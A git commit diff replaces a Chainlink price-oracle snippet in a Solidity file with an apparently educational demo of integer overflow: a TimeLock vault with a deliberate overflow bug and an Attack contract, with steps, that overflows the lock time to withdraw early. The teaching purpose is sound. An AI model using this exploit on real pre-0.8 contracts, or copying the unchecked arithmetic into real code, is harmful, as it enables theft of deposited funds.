4257a25d59ed18c7ba0faf9fd7d8a2756307169c
slowisfast <slowisfast2030@163.com>
2023-05-26 02:51:05 +0530

    less is more

--- temp.sol
+++ temp.sol
@@ -1,33 +1,82 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.17;
+pragma solidity ^0.7.6;
 
-// import "./node_modules/@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+/*
+Arithmetic Overflow and Underflow Vulnerability
 
-interface AggregatorV3Interface {
-    function latestRoundData()
-        external
-        view
-        returns (
-            uint80 roundId,
-            int answer,
-            uint startedAt,
-            uint updatedAt,
-            uint80 answeredInRound
+Solidity < 0.8
+Integers in Solidity overflow / underflow without any errors
+
+Solidity >= 0.8
+Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.
+*/
+
+// This contract is designed to act as a time vault.
+// User can deposit into this contract but cannot withdraw for at least a week.
+// User can also extend the wait time beyond the 1 week waiting period.
+
+/*
+1. Deploy TimeLock
+2. Deploy Attack with address of TimeLock
+3. Call Attack.attack sending 1 ether. You will immediately be able to
+   withdraw your ether.
+
+What happened?
+Attack caused the TimeLock.lockTime to overflow and was able to withdraw
+before the 1 week waiting period.
+*/
+
+contract TimeLock {
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "Insufficient funds");
+        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = TimeLock(_timeLock);
+    }
+
+    fallback() external payable {}
+    receive() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        timeLock.increaseLockTime(
+            type(uint).max + 1 - timeLock.lockTime(address(this))
         );
-}
-
-contract ChainlinkPriceOracle {
-    AggregatorV3Interface internal priceFeed;
-
-    constructor() {
-        // ETH / USD
-        priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
+        timeLock.withdraw();
     }
 
-    function getLatestPrice() public view returns (int) {
-        (, int price,,,) = priceFeed.latestRoundData();
-        // for ETH / USD price is scaled up by 10 ** 8
-        return price / 1e8;
+    function getBalance() public view returns (uint){
+        return address(this).balance;
     }
 }
-
